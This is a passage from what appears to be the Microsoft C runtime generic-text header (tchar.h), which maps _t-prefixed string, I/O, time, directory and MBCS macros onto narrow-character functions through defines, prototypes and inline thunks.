#define _stscanf_s_l    _sscanf_s_l
#define _sntscanf       _snscanf
#define _sntscanf_l     _snscanf_l
#define _sntscanf_s     _snscanf_s
#define _sntscanf_s_l   _snscanf_s_l
#define _vtscanf        vscanf
#define _vtscanf_s      vscanf_s
#define _vftscanf       vfscanf
#define _vftscanf_s     vfscanf_s
#define _vstscanf       vsscanf
#define _vstscanf_s     vsscanf_s


/* Unformatted i/o */

#define _fgettc          fgetc
#define _fgettc_nolock   _fgetc_nolock
#define _fgettchar       _fgetchar
#define _fgetts          fgets
#define _fputtc          fputc
#define _fputtc_nolock   _fputc_nolock
#define _fputtchar       _fputchar
#define _fputts          fputs
#define _cputts          _cputs
#define _gettc           getc
#define _gettc_nolock    _getc_nolock
#define _gettch          _getch
#define _gettch_nolock   _getch_nolock
#define _gettche         _getche
#define _gettche_nolock  _getche_nolock
#define _gettchar        getchar
#define _gettchar_nolock _getchar_nolock
#define _getts_s         gets_s
#define _cgetts_s        _cgets_s
#define _puttc           putc
#define _puttc_nolock    _fputc_nolock
#define _puttchar        putchar
#define _puttchar_nolock _putchar_nolock
#define _puttch          _putch
#define _puttch_nolock   _putch_nolock
#define _putts           puts
#define _ungettc         ungetc
#define _ungettc_nolock  _ungetc_nolock
#define _ungettch        _ungetch
#define _ungettch_nolock _ungetch_nolock

/* String conversion functions */

#define _tcstod     strtod
#define _tcstof     strtof
#define _tcstol     strtol
#define _tcstold    strtold
#define _tcstoll    strtoll
#define _tcstoul    strtoul
#define _tcstoull   strtoull
#define _tcstoimax  strtoimax
#define _tcstoumax  strtoumax
#define _ttof       atof
#define _tstof      atof
#define _tstol      atol
#define _tstoll     atoll
#define _tstoi      atoi
#define _tstoi64    _atoi64
#define _tcstod_l     _strtod_l
#define _tcstof_l     _strtof_l
#define _tcstol_l     _strtol_l
#define _tcstold_l    _strtold_l
#define _tcstoll_l    _strtoll_l
#define _tcstoul_l    _strtoul_l
#define _tcstoull_l   _strtoull_l
#define _tcstoimax_l  _strtoimax_l
#define _tcstoumax_l  _strtoumax_l
#define _tstof_l      _atof_l
#define _tstol_l      _atol_l
#define _tstoll_l     _atoll_l
#define _tstoi_l      _atoi_l
#define _tstoi64_l    _atoi64_l

#define _itot_s     _itoa_s
#define _ltot_s     _ltoa_s
#define _ultot_s    _ultoa_s
#define _itot       _itoa
#define _ltot       _ltoa
#define _ultot      _ultoa
#define _ttoi       atoi
#define _ttol       atol
#define _ttoll      atoll

#define _ttoi64     _atoi64
#define _tcstoi64   _strtoi64
#define _tcstoi64_l   _strtoi64_l
#define _tcstoui64  _strtoui64
#define _tcstoui64_l  _strtoui64_l
#define _i64tot_s   _i64toa_s
#define _ui64tot_s  _ui64toa_s
#define _i64tot     _i64toa
#define _ui64tot    _ui64toa

/* String functions */

/* Note that _mbscat, _mbscpy and _mbsdup are functionally equivalent to
   strcat, strcpy and strdup, respectively. */

#define _tcscat     strcat
#define _tcscat_s   strcat_s
#define _tcscpy     strcpy
#define _tcscpy_s   strcpy_s
#define _tcsdup     _strdup
#define _tcslen     strlen
#define _tcsnlen    strnlen
#define _tcsxfrm    strxfrm
#define _tcsxfrm_l    _strxfrm_l
#define _tcserror   strerror
#define _tcserror_s   strerror_s
#define __tcserror  _strerror
#define __tcserror_s  _strerror_s

#ifdef _DEBUG
#define _tcsdup_dbg _strdup_dbg
#endif  /* _DEBUG */

/* Execute functions */

#define _texecl     _execl
#define _texecle    _execle
#define _texeclp    _execlp
#define _texeclpe   _execlpe
#define _texecv     _execv
#define _texecve    _execve
#define _texecvp    _execvp
#define _texecvpe   _execvpe

#define _tspawnl    _spawnl
#define _tspawnle   _spawnle
#define _tspawnlp   _spawnlp
#define _tspawnlpe  _spawnlpe
#define _tspawnv    _spawnv
#define _tspawnve   _spawnve
#define _tspawnvp   _spawnvp
#define _tspawnvpe  _spawnvpe

#define _tsystem    system


/* Time functions */

#define _tasctime   asctime
#define _tctime     ctime
#define _tctime32   _ctime32
#define _tctime64   _ctime64
#define _tstrdate   _strdate
#define _tstrtime   _strtime
#define _tutime     _utime
#define _tutime32   _utime32
#define _tutime64   _utime64
#define _tcsftime   strftime
#define _tcsftime_l _strftime_l

#define _tasctime_s   asctime_s
#define _tctime_s     ctime_s
#define _tctime32_s   _ctime32_s
#define _tctime64_s   _ctime64_s
#define _tstrdate_s   _strdate_s
#define _tstrtime_s   _strtime_s

/* Directory functions */

#define _tchdir             _chdir
#define _tgetcwd            _getcwd
#define _tgetdcwd           _getdcwd
#define _tgetdcwd_nolock    _getdcwd_nolock
#define _tmkdir             _mkdir
#define _trmdir             _rmdir

#ifdef _DEBUG
#define _tgetcwd_dbg        _getcwd_dbg
#define _tgetdcwd_dbg       _getdcwd_dbg
#define _tgetdcwd_lk_dbg    _getdcwd_lk_dbg
#endif  /* _DEBUG */

/* Environment/Path functions */

#define _tfullpath      _fullpath
#define _tgetenv        getenv
#define _tgetenv_s      getenv_s
#define _tdupenv_s      _dupenv_s
#define _tmakepath      _makepath
#define _tmakepath_s    _makepath_s
#define _tpgmptr        _pgmptr
#define _get_tpgmptr    _get_pgmptr
#define _tputenv        _putenv
#define _tputenv_s      _putenv_s
#define _tsearchenv     _searchenv
#define _tsearchenv_s   _searchenv_s
#define _tsplitpath     _splitpath
#define _tsplitpath_s   _splitpath_s

#ifdef _DEBUG
#define _tfullpath_dbg  _fullpath_dbg
#define _tdupenv_s_dbg  _dupenv_s_dbg
#endif  /* _DEBUG */

/* Stdio functions */

#define _tfdopen    _fdopen
#define _tfsopen    _fsopen
#define _tfopen     fopen
#define _tfopen_s   fopen_s
#define _tfreopen   freopen
#define _tfreopen_s freopen_s
#define _tperror    perror
#define _tpopen     _popen
#define _ttempnam   _tempnam
#define _ttmpnam    tmpnam
#define _ttmpnam_s  tmpnam_s

#ifdef _DEBUG
#define _ttempnam_dbg   _tempnam_dbg
#endif  /* _DEBUG */


/* Io functions */

#define _tchmod     _chmod
#define _tcreat     _creat
#define _tfindfirst      _findfirst
#define _tfindfirst32    _findfirst32
#define _tfindfirst64    _findfirst64
#define _tfindfirsti64   _findfirsti64
#define _tfindfirst32i64 _findfirst32i64
#define _tfindfirst64i32 _findfirst64i32
#define _tfindnext       _findnext
#define _tfindnext32     _findnext32
#define _tfindnext64     _findnext64
#define _tfindnexti64    _findnexti64
#define _tfindnext32i64  _findnext32i64
#define _tfindnext64i32  _findnext64i32
#define _tmktemp            _mktemp
#define _tmktemp_s          _mktemp_s

#define _topen      _open
#define _taccess    _access
#define _taccess_s  _access_s

#define _tremove    remove
#define _trename    rename
#define _tsopen     _sopen
#define _tsopen_s   _sopen_s
#define _tunlink    _unlink

#define _tfinddata_t      _finddata_t
#define _tfinddata32_t    _finddata32_t
#define _tfinddata64_t    __finddata64_t
#define _tfinddatai64_t   _finddatai64_t
#define _tfinddata32i64_t _finddata32i64_t
#define _tfinddata64i32_t _finddata64i32_t

/* ctype functions */
#define _istascii       __isascii
#define _istcntrl       iscntrl
#define _istcntrl_l     _iscntrl_l
#define _istxdigit      isxdigit
#define _istxdigit_l    _isxdigit_l

/* Stat functions */
#define _tstat      _stat
#define _tstat32    _stat32
#define _tstat32i64 _stat32i64
#define _tstat64    _stat64
#define _tstat64i32 _stat64i32
#define _tstati64   _stati64


/* Setlocale functions */

#define _tsetlocale setlocale


#ifdef _MBCS

#ifndef _CRT_USE_WINAPI_FAMILY_DESKTOP_APP
#error Multibyte Character Set (MBCS) not supported for the current WINAPI_FAMILY.
#endif  /* _CRT_USE_WINAPI_FAMILY_DESKTOP_APP */

/* ++++++++++++++++++++ MBCS ++++++++++++++++++++ */

#ifdef __cplusplus
}   /* ... extern "C" */
#endif  /* __cplusplus */

#include &lt;mbstring.h&gt;

#ifdef __cplusplus
extern "C" {
#endif  /* __cplusplus */


#ifndef __TCHAR_DEFINED
typedef char            _TCHAR;
typedef signed char     _TSCHAR;
typedef unsigned char   _TUCHAR;
typedef unsigned char   _TXCHAR;
typedef unsigned int    _TINT;
#define __TCHAR_DEFINED
#endif  /* __TCHAR_DEFINED */

#if defined(_CRT_INTERNAL_NONSTDC_NAMES) &amp;&amp; _CRT_INTERNAL_NONSTDC_NAMES
#ifndef _TCHAR_DEFINED
typedef char            TCHAR;
typedef char *          PTCHAR;
typedef unsigned char   TBYTE;
typedef unsigned char * PTBYTE;
#define _TCHAR_DEFINED
#endif  /* _TCHAR_DEFINED */
#endif  /* _CRT_INTERNAL_NONSTDC_NAMES */


#ifdef _MB_MAP_DIRECT

/* use mb functions directly - types must match */

/* String functions */

#define _tcschr         _mbschr
#define _tcscspn        _mbscspn
#define _tcsncat        _mbsnbcat
#define _tcsncat_s      _mbsnbcat_s
#define _tcsncat_l      _mbsnbcat_l
#define _tcsncat_s_l    _mbsnbcat_s_l
#define _tcsncpy        _mbsnbcpy
#define _tcsncpy_s      _mbsnbcpy_s
#define _tcsncpy_l      _mbsnbcpy_l
#define _tcsncpy_s_l    _mbsnbcpy_s_l
#define _tcspbrk        _mbspbrk
#define _tcsrchr        _mbsrchr
#define _tcsspn         _mbsspn
#define _tcsstr         _mbsstr
#define _tcstok         _mbstok
#define _tcstok_s       _mbstok_s
#define _tcstok_l       _mbstok_l
#define _tcstok_s_l     _mbstok_s_l

#define _tcsnset        _mbsnbset
#define _tcsnset_l      _mbsnbset_l
#define _tcsnset_s      _mbsnbset_s
#define _tcsnset_s_l    _mbsnbset_s_l
#define _tcsrev         _mbsrev
#define _tcsset         _mbsset
#define _tcsset_s       _mbsset_s
#define _tcsset_l       _mbsset_l
#define _tcsset_s_l     _mbsset_s_l

#define _tcscmp         _mbscmp
#define _tcsicmp        _mbsicmp
#define _tcsicmp_l      _mbsicmp_l
#define _tcsnccmp       _mbsncmp
#define _tcsncmp        _mbsnbcmp
#define _tcsncicmp      _mbsnicmp
#define _tcsncicmp_l    _mbsnicmp_l
#define _tcsnicmp       _mbsnbicmp
#define _tcsnicmp_l     _mbsnbicmp_l

#define _tcscoll        _mbscoll
#define _tcscoll_l      _mbscoll_l
#define _tcsicoll       _mbsicoll
#define _tcsicoll_l     _mbsicoll_l
#define _tcsnccoll      _mbsncoll
#define _tcsnccoll_l    _mbsncoll_l
#define _tcsncoll       _mbsnbcoll
#define _tcsncoll_l     _mbsnbcoll_l
#define _tcsncicoll     _mbsnicoll
#define _tcsncicoll_l   _mbsnicoll_l
#define _tcsnicoll      _mbsnbicoll
#define _tcsnicoll_l    _mbsnbicoll_l

/* "logical-character" mappings */

#define _tcsclen        _mbslen
#define _tcscnlen       _mbsnlen
#define _tcsclen_l      _mbslen_l
#define _tcscnlen_l     _mbsnlen_l
#define _tcsnccat       _mbsncat
#define _tcsnccat_s     _mbsncat_s
#define _tcsnccat_l     _mbsncat_l
#define _tcsnccat_s_l   _mbsncat_s_l
#define _tcsnccpy       _mbsncpy
#define _tcsnccpy_s     _mbsncpy_s
#define _tcsnccpy_l     _mbsncpy_l
#define _tcsnccpy_s_l   _mbsncpy_s_l
#define _tcsncset       _mbsnset
#define _tcsncset_s     _mbsnset_s
#define _tcsncset_l     _mbsnset_l
#define _tcsncset_s_l   _mbsnset_s_l

/* MBCS-specific mappings */

#define _tcsdec     _mbsdec
#define _tcsinc     _mbsinc
#define _tcsnbcnt   _mbsnbcnt
#define _tcsnccnt   _mbsnccnt
#define _tcsnextc   _mbsnextc
#define _tcsninc    _mbsninc
#define _tcsspnp    _mbsspnp

#define _tcslwr     _mbslwr
#define _tcslwr_l   _mbslwr_l
#define _tcslwr_s   _mbslwr_s
#define _tcslwr_s_l _mbslwr_s_l
#define _tcsupr     _mbsupr
#define _tcsupr_l   _mbsupr_l
#define _tcsupr_s   _mbsupr_s
#define _tcsupr_s_l _mbsupr_s_l

#define _tclen      _mbclen
#define _tccpy      _mbccpy
#define _tccpy_l    _mbccpy_l
#define _tccpy_s    _mbccpy_s
#define _tccpy_s_l  _mbccpy_s_l

#else  /* _MB_MAP_DIRECT */

#if __STDC__ || defined _NO_INLINING

/* use type-safe linked-in function thunks */

/* String functions */

_Check_return_ _ACRTIMP _CONST_RETURN char * __cdecl _tcschr(_In_z_ const char * _Str, _In_ unsigned int _Val);
_Check_return_ _ACRTIMP size_t __cdecl _tcscspn(_In_z_ const char * _Str, _In_z_ const char * _Control);
_CRT_INSECURE_DEPRECATE(_tcsncat_s) _ACRTIMP char * __cdecl _tcsncat(_Inout_updates_z_(_MaxCount) char *_Dst, _In_z_ const char *_Src, _In_ size_t _MaxCount);
_ACRTIMP char * __cdecl _tcsncat_s(_Inout_updates_z_(_DstSizeInChars) char *_Dst, _In_ size_t _DstSizeInChars, _In_z_ const char *_Src, size_t _MaxCount);
_CRT_INSECURE_DEPRECATE(_tcsncat_s_l) _ACRTIMP char * __cdecl _tcsncat_l(_Inout_updates_z_(_MaxCount) char *_Dst, _In_z_ const char *_Src, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_ACRTIMP char * __cdecl _tcsncat_s_l(_Inout_updates_z_(_DstSizeInChars) char *_Dst, _In_ size_t _DstSizeInChars, _In_z_ const char *_Src, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_CRT_INSECURE_DEPRECATE(_tcsncpy_s) _ACRTIMP char * __cdecl _tcsncpy(_Out_writes_(_MaxCount) _Post_maybez_ char *_Dst, _In_z_ const char *_Src, size_t _MaxCount);
_ACRTIMP char * __cdecl _tcsncpy_s(_Out_writes_(_DstSizeInChars) char *_Dst, _In_ size_t _DstSizeInChars, _In_z_ const char *_Src, size_t _MaxCount);
_CRT_INSECURE_DEPRECATE(_tcsncpy_s_l) _ACRTIMP char * __cdecl _tcsncpy_l(_Out_writes_(_MaxCount) _Post_maybez_ char *_Dst, _In_z_ const char *_Src, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_ACRTIMP char * __cdecl _tcsncpy_s_l(_Out_writes_(_DstSizeInChars) char *_Dst, _In_ size_t _DstSizeInChars, _In_z_ const char *_Src, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP _CONST_RETURN char * __cdecl _tcspbrk(_In_z_ const char * _Str, _In_z_ const char * _Control);
_Check_return_ _ACRTIMP _CONST_RETURN char * __cdecl _tcsrchr(_In_z_ const char * _Str, _In_ unsigned int _Ch);
_Check_return_ _ACRTIMP size_t __cdecl _tcsspn(_In_z_ const char * _Str, _In_z_ const char * _Control);
_Check_return_ _ACRTIMP _CONST_RETURN char * __cdecl _tcsstr(_In_z_ const char * _Str, _In_z_ const char * _Substr);
_Check_return_ _CRT_INSECURE_DEPRECATE(_tcstok_s) _ACRTIMP char * __cdecl _tcstok(_Inout_opt_ char *_Str, _In_z_ const char *_Delim);
_Check_return_ _ACRTIMP char * __cdecl _tcstok_s(_Inout_opt_ char *_Str, _In_z_ const char *_Delim, _Inout_ _Deref_prepost_opt_z_ char **_Context);
_Check_return_ _CRT_INSECURE_DEPRECATE(_tcstok_s_l) _ACRTIMP char * __cdecl _tcstok_l(_Inout_opt_ char *_Str, _In_z_ const char *_Delim, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP char * __cdecl _tcstok_s_l(_Inout_opt_ char *_Str, _In_z_ const char *_Delim, _Inout_ _Deref_prepost_opt_z_ char **_Context, _In_opt_ _locale_t _Locale);

_CRT_INSECURE_DEPRECATE(_tcsnset_s) _ACRTIMP char * __cdecl _tcsnset(_Inout_z_ char * _Str, _In_ unsigned int _Val, _In_ size_t _MaxCount);
_Check_return_wat_ _ACRTIMP errno_t __cdecl _tcsnset_s(_Inout_updates_z_(_SizeInChars) char * _Str, _In_ size_t _SizeInChars, _In_ unsigned int _Val , _In_ size_t _MaxCount);
_CRT_INSECURE_DEPRECATE(_tcsnset_s_l) _ACRTIMP char * __cdecl _tcsnset_l(_Inout_z_ char * _Str, _In_ unsigned int _Val, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_Check_return_wat_ _ACRTIMP errno_t __cdecl _tcsnset_s_l(_Inout_updates_z_(_SizeInChars) char * _Str, _In_ size_t _SizeInChars, _In_ unsigned int _Val , _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_ACRTIMP char * __cdecl _tcsrev(_Inout_z_ char * _Str);
_CRT_INSECURE_DEPRECATE(_tcsset_s) _ACRTIMP char * __cdecl _tcsset(_Inout_z_ char * _Str, _In_ unsigned int _Val);
_CRT_INSECURE_DEPRECATE(_tcsset_s_l) _ACRTIMP char * __cdecl _tcsset_l(_Inout_z_ char * _Str, _In_ unsigned int _Val, _In_opt_ _locale_t _Locale);
_Check_return_wat_ _ACRTIMP errno_t __cdecl _tcsset_s(_Inout_updates_z_(_SizeInChars) char * _Str, _In_ size_t _SizeInChars, _In_ unsigned int _Val);
_Check_return_wat_ _ACRTIMP errno_t __cdecl _tcsset_s_l(_Inout_updates_z_(_SizeInChars) char * _Str, _In_ size_t _SizeInChars, _In_ unsigned int, _In_opt_ _locale_t _Locale);

_Check_return_ _ACRTIMP int __cdecl _tcscmp(_In_z_ const char *_Str1, _In_z_ const char * _Str);
_Check_return_ _ACRTIMP int __cdecl _tcsicmp(_In_z_ const char *_Str1, _In_z_ const char *_Str2);
_Check_return_ _ACRTIMP int __cdecl _tcsicmp_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP int __cdecl _tcsnccmp(_In_z_ const char * _Str1, _In_z_ const char * _Str2, _In_ size_t _MaxCount);
_Check_return_ _ACRTIMP int __cdecl _tcsncmp(_In_z_ const char * _Str1, _In_z_ const char * _Str2, _In_ size_t _MaxCount);
_Check_return_ _ACRTIMP int __cdecl _tcsncicmp(_In_z_ const char * _Str1, _In_z_ const char * _Str2, _In_ size_t _MaxCount);
_Check_return_ _ACRTIMP int __cdecl _tcsncicmp_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP int __cdecl _tcsnicmp(_In_z_ const char * _Str1, _In_z_ const char * _Str2, _In_ size_t _MaxCount);
_Check_return_ _ACRTIMP int __cdecl _tcsnicmp_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, size_t _MaxCount, _In_opt_ _locale_t _Locale);

_Check_return_ _ACRTIMP int __cdecl _tcscoll(_In_z_ const char * _Str1, _In_z_ const char * _Str2);
_Check_return_ _ACRTIMP int __cdecl _tcscoll_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP int __cdecl _tcsicoll(_In_z_ const char * _Str1, _In_z_ const char * _Str2);
_Check_return_ _ACRTIMP int __cdecl _tcsicoll_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP int __cdecl _tcsnccoll(_In_z_ const char * _Str1, _In_z_ const char * _Str2, _In_ size_t _MaxCount);
_Check_return_ _ACRTIMP int __cdecl _tcsnccoll_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP int __cdecl _tcsncoll(_In_z_ const char *_Str1, _In_z_ const char * _Str2, _In_ size_t _MaxCount);
_Check_return_ _ACRTIMP int __cdecl _tcsncoll_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, size_t _MaxCount, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP int __cdecl _tcsncicoll(_In_z_ const char * _Str1, _In_z_ const char * _Str2, _In_ size_t _MaxCount);
_Check_return_ _ACRTIMP int __cdecl _tcsncicoll_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_Check_return_ _ACRTIMP int __cdecl _tcsnicoll(_In_z_ const char * _Str1, _In_z_ const char * _Str2, _In_ size_t _MaxCount);
_Check_return_ _ACRTIMP int __cdecl _tcsnicoll_l(_In_z_ const char *_Str1, _In_z_ const char *_Str2, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);

/* "logical-character" mappings */

_Post_satisfies_(return &lt;= _String_length_(_Str))
_Check_return_ _ACRTIMP size_t __cdecl _tcsclen(_In_z_ const char *_Str);

_Post_satisfies_(return &lt;= _String_length_(_Str) &amp;&amp; return &lt;= _MaxCount)
_Check_return_ _ACRTIMP size_t __cdecl _tcscnlen(_In_z_ const char *_Str, _In_ size_t _MaxCount);

_Post_satisfies_(return &lt;= _String_length_(_Str))
_Check_return_ _ACRTIMP size_t __cdecl _tcsclen_l(_In_z_ const char *_Str, _In_opt_ _locale_t _Locale);

_Post_satisfies_(return &lt;= _String_length_(_Str) &amp;&amp; return &lt;= _MaxCount)
_Check_return_ _ACRTIMP size_t __cdecl _tcscnlen_l(_In_z_ const char *_Str, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);

_CRT_INSECURE_DEPRECATE(_tcsnccat_s) _ACRTIMP char * __cdecl _tcsnccat(_Inout_ char *_Dst, _In_z_ const char *_Src, _In_ size_t _MaxCount);
_ACRTIMP char * __cdecl _tcsnccat_s(_Inout_updates_z_(_DstSizeInChars) char *_Dst, _In_ size_t _DstSizeInChars, _In_z_ const char *_Src, _In_ size_t _MaxCount);
_CRT_INSECURE_DEPRECATE(_tcsnccat_s_l) _ACRTIMP char * __cdecl _tcsnccat_l(_Inout_ char *_Dst, _In_z_ const char *_Src, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_ACRTIMP char * __cdecl _tcsnccat_s_l(_Inout_updates_z_(_DstSizeInChars) char *_Dst, _In_ size_t _DstSizeInChars, _In_z_ const char *_Src, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_CRT_INSECURE_DEPRECATE(_tcsnccpy_s) _ACRTIMP char * __cdecl _tcsnccpy(_Out_writes_(_MaxCount) _Post_maybez_ char *_Dst, _In_z_ const char *_Src, _In_ size_t _MaxCount);
_ACRTIMP char * __cdecl _tcsnccpy_s(_Out_writes_(_DstSizeInChars) char *_Dst, _In_ size_t _DstSizeInChars, _In_z_ const char *_Src, _In_ size_t _MaxCount);
_CRT_INSECURE_DEPRECATE(_tcsnccpy_s_l) _ACRTIMP char * __cdecl _tcsnccpy_l(_Out_writes_(_MaxCount) _Post_maybez_ char *_Dst, _In_z_ const char *_Src, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_ACRTIMP char * __cdecl _tcsnccpy_s_l(_Out_writes_(_DstSizeInChars) char *_Dst, _In_ size_t _DstSizeInChars, _In_z_ const char *_Src, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_CRT_INSECURE_DEPRECATE(_tcsncset_s) _ACRTIMP char * __cdecl _tcsncset(_Inout_updates_z_(_MaxCount) char * _Str, _In_ unsigned int _Val, _In_ size_t _MaxCount);
_ACRTIMP char * __cdecl _tcsncset_s(_Inout_updates_z_(_SizeInChars) char * _Str, _In_ size_t _SizeInChars, _In_ unsigned int _Val, _In_ size_t _MaxCount);
_CRT_INSECURE_DEPRECATE(_tcsncset_s_l) _ACRTIMP char * __cdecl _tcsncset_l(_Inout_updates_z_(_MaxCount) char * _Str, _In_ unsigned int _Val, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);
_ACRTIMP char * __cdecl _tcsncset_s_l(_Inout_updates_z_(_SizeInChars) char * _Str, _In_ size_t _SizeInChars, _In_ unsigned int _Val, _In_ size_t _MaxCount, _In_opt_ _locale_t _Locale);

/* MBCS-specific mappings */

_ACRTIMP char * __cdecl _tcsdec(_In_reads_z_(_Pos-_Start+1) const char * _Start, _In_z_ const char * _Pos);
_ACRTIMP char * __cdecl _tcsinc(_In_z_ const char * _Ptr);
_ACRTIMP size_t __cdecl _tcsnbcnt(_In_reads_or_z_(_MaxCount) const char * _Str, _In_ size_t _MaxCount);
_ACRTIMP size_t __cdecl _tcsnccnt(_In_reads_or_z_(_MaxCount) const char * _Str, _In_ size_t _MaxCount);
_ACRTIMP unsigned int __cdecl _tcsnextc (_In_z_ const char * _Str);
_ACRTIMP char * __cdecl _tcsninc(_In_reads_or_z_(_Count) const char * _Ptr, _In_ size_t _Count);
_ACRTIMP char * __cdecl _tcsspnp(_In_z_ const char * _Str1, _In_z_ const char * _Str2);

_CRT_INSECURE_DEPRECATE(_tcslwr_s) _ACRTIMP char * __cdecl _tcslwr(_Inout_ char *_Str);
_CRT_INSECURE_DEPRECATE(_tcslwr_s_l) _ACRTIMP char * __cdecl _tcslwr_l(_Inout_ char *_Str, _In_opt_ _locale_t _Locale);
_ACRTIMP char * __cdecl _tcslwr_s(_Inout_updates_z_(_SizeInChars) char *_Str, _In_ size_t _SizeInChars);
_ACRTIMP char * __cdecl _tcslwr_s_l(_Inout_updates_z_(_SizeInChars) char *_Str, _In_ size_t _SizeInChars, _In_opt_ _locale_t _Locale);
_CRT_INSECURE_DEPRECATE(_tcsupr_s) _ACRTIMP char * __cdecl _tcsupr(_Inout_ char *_Str);
_CRT_INSECURE_DEPRECATE(_tcsupr_s_l) _ACRTIMP char * __cdecl _tcsupr_l(_Inout_ char *_Str, _In_opt_ _locale_t _Locale);
_ACRTIMP char * __cdecl _tcsupr_s(_Inout_updates_z_(_SizeInChars) char *_Str, _In_ size_t _SizeInChars);
_ACRTIMP char * __cdecl _tcsupr_s_l(_Inout_updates_z_(_SizeInChars) char *_Str, _In_ size_t _SizeInChars, _In_opt_ _locale_t _Locale);

_Check_return_ _ACRTIMP size_t __cdecl _tclen(_In_z_ const char * _Str);
_CRT_INSECURE_DEPRECATE(_tccpy_s) _ACRTIMP void __cdecl _tccpy(_Pre_notnull_ _Post_z_ char * _DstCh, _In_z_ const char * _SrcCh);
_CRT_INSECURE_DEPRECATE(_tccpy_s_l) _ACRTIMP void __cdecl _tccpy_l(_Pre_notnull_ _Post_z_ char * _DstCh, _In_z_ const char * _SrcCh, _In_opt_ _locale_t _Locale);
_Check_return_wat_ _ACRTIMP errno_t __cdecl _tccpy_s(_Out_writes_z_(_SizeInBytes) char * _DstCh, size_t _SizeInBytes, _Out_opt_ int *_PCopied, _In_z_ const char * _SrcCh);
_Check_return_wat_ _ACRTIMP errno_t __cdecl _tccpy_s_l(_Out_writes_z_(_SizeInBytes) char * _DstCh, size_t _SizeInBytes, _Out_opt_ int *_PCopied, _In_z_ const char * _SrcCh, _In_opt_ _locale_t _Locale);

#else  /* __STDC__ || defined (_NO_INLINING) */

/* the default: use type-safe inline function thunks */

#define _PUC    unsigned char *
#define _CPUC   const unsigned char *
#define _PC     char *
#define _CRPC   _CONST_RETURN char *
#define _CPC    const char *
#define _UI     unsigned int


/* String functions */

__inline _CRPC _tcschr(_In_z_ _CPC _s1,_In_ _UI _c) {return (_CRPC)_mbschr((_CPUC)_s1,_c);}
__inline size_t _tcscspn(_In_z_ _CPC _s1,_In_z_ _CPC _s2) {return _mbscspn((_CPUC)_s1,(_CPUC)_s2);}

_Check_return_wat_ __inline errno_t _tcsncat_s(_Inout_updates_z_(_Destination_size_chars) char *_Destination, _In_ size_t _Destination_size_chars, _In_z_ const char *_Source, _In_ size_t _Count)
{
    return _mbsnbcat_s((unsigned char *)_Destination, _Destination_size_chars, (const unsigned char *)_Source,_Count);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _tcsncat_s, _Prepost_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsncat, _tcsncat_s, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count)
{
    return (char *)_mbsnbcat((unsigned char *)_Dst,(const unsigned char *)_Source,_Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsncat, _tcsncat_s, _Inout_updates_z_(_Size) char, _Inout_z_, char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count)

_Check_return_wat_ __inline errno_t _tcsncat_s_l(_Inout_updates_z_(_Destination_size_chars) char *_Destination, _In_ size_t _Destination_size_chars, _In_z_ const char *_Source, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsnbcat_s_l((unsigned char *)_Destination, _Destination_size_chars, (const unsigned char *)_Source,_Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _tcsncat_s_l, _Prepost_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsncat_l, _tcsncat_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbsnbcat_l((unsigned char *)_Dst,(const unsigned char *)_Source,_Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsncat_l, _tcsncat_s_l, _Inout_updates_z_(_Size) char, _Inout_z_, char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

_Check_return_wat_ __inline errno_t _tcsncpy_s(_Out_writes_z_(_Destination_size_chars) char * _Destination, _In_ size_t _Destination_size_chars, _In_z_ const char * _Source,_In_ size_t _Count)
{
    return _mbsnbcpy_s((unsigned char *)_Destination, _Destination_size_chars, (const unsigned char *)_Source,_Count);
}

